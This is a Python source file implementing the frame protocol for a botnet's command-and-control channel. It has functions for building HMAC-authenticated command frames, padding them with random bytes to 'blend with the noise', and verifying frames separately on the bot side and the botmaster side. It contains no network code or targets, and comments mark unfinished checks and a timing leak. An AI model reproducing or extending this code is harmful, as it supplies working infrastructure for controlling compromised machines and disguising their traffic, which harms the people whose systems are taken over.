from cryptography.hazmat.primitives import hashes, hmac
import os
import random
import struct
import zlib
from globvars import ROOT_SECRET, MAGIC_BYTES, PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, CMD_TYPES, RESP_TYPES

class ProtocolHandler:
    def __init__(self, secret: bytes):
        self.secret = secret

    def compute_auth_tag(self, session_key: bytes, payload: bytes) -> bytes:
        h = hmac.HMAC(session_key, hashes.SHA256())
        h.update(payload)
        return h.finalize()

    def build_frame(self, cmd_type, payload) -> dict:
        # if len(payload) > MAX_FRAME_SIZE:
        #     raise ValueError("Payload size exceeds maximum frame size.")
        # if len(payload) < MIN_FRAME_SIZE:
        #     raise ValueError("Payload size below minimum frame size.")
        if not isinstance(payload, bytes):
            raise TypeError("Payload must be of type bytes.")
        
        auth = self.compute_auth_tag(self.secret, payload)
        checksum = zlib.crc32(payload) & 0xffffffff
        return struct.pack(
            f"!2s B B H 32s {len(payload)}s I",
            MAGIC_BYTES,
            PROTOCOL_VERSION,
            cmd_type,
            len(payload),
            auth,
            payload,
            checksum
        )

    def encode_frame(self, frame: bytes) -> bytes:
        # blend with the noise
        # pad_before = random.randint(0, 16)
        pad_after = random.randint(0, 16)

        # prefix = os.urandom(pad_before)
        suffix = os.urandom(pad_after)

        # blend_frame = prefix + frame + suffix
        blend_frame = frame + suffix
        return blend_frame


    def decode_frame(self, data: bytes) -> tuple | None:
        # magic = MAGIC_BYTES
        # magic_index = data.find(magic)
        magic_index = 0

        try:
            header_size = struct.calcsize("!2s B B H 32s")
            header = data[magic_index:magic_index + header_size]
            (magic, version, cmd_type, length, auth) = struct.unpack("!2s B B H 32s", header)

            payload_start = magic_index + header_size
            payload_end = payload_start + length
            payload = data[payload_start:payload_end]
            if payload_end + 4 > len(data):
                print(f"Cannot unpack checksum!")
                return None
            checksum = struct.unpack("!I", data[payload_end:payload_end + 4])[0]
            return (magic, version, cmd_type, length, auth, payload, checksum) 
        except Exception as e:
            print(f"Failed to unpack frame: {e}")
            return None


    def verify_frame_bot_side(self, data: tuple) -> bool: 
        (magic, version, cmd_type, length, auth, payload, checksum) = data
        
        if magic != MAGIC_BYTES:
            print("Magic bytes mismatch")
            return False

        # if not (cmd_type in CMD_TYPES.values() or cmd_type in RESP_TYPES.values()):
        if not (cmd_type in CMD_TYPES.values()): 
            print(f"Command type mismatch ({cmd_type})")
            return False
        
        # min/max payload size is not set yet
        # if length <= MIN_FRAME_SIZE or length >= MAX_FRAME_SIZE:
        #     print("Invalid frame length")
        #     return False
        
        if version != PROTOCOL_VERSION:
            print("Version mismatch.")
            return False
        
        if zlib.crc32(payload) & 0xffffffff != checksum:
            print("Checksum mismatch.")
            return False
    
        # TODO
        # this leaks timing info! use constant-time comparison primitve instead
        expected_auth = self.compute_auth_tag(self.secret, payload)
        if auth != expected_auth:
            print("Authentication failed.")
            return False

        return True 

    def verify_frame_botmaster_side(self, data: tuple) -> bool: 
        (magic, version, cmd_type, length, auth, payload, checksum) = data
        
        if magic != MAGIC_BYTES:
            print("Magic bytes mismatch")
            return False

        if not (cmd_type in RESP_TYPES.values()): 
            print(f"Command type mismatch ({cmd_type})")
            return False
        
        # min/max payload size is not set yet
        # if length <= MIN_FRAME_SIZE or length >= MAX_FRAME_SIZE:
        #     print("Invalid frame length")
        #     return False
        
        if version != PROTOCOL_VERSION:
            print("Version mismatch.")
            return False
        
        if zlib.crc32(payload) & 0xffffffff != checksum:
            print("Checksum mismatch.")
            return False
    
        # TODO
        # this leaks timing info! use constant-time comparison primitve instead
        expected_auth = self.compute_auth_tag(self.secret, payload)
        if auth != expected_auth:
            print("Authentication failed.")
            return False

        return True 
    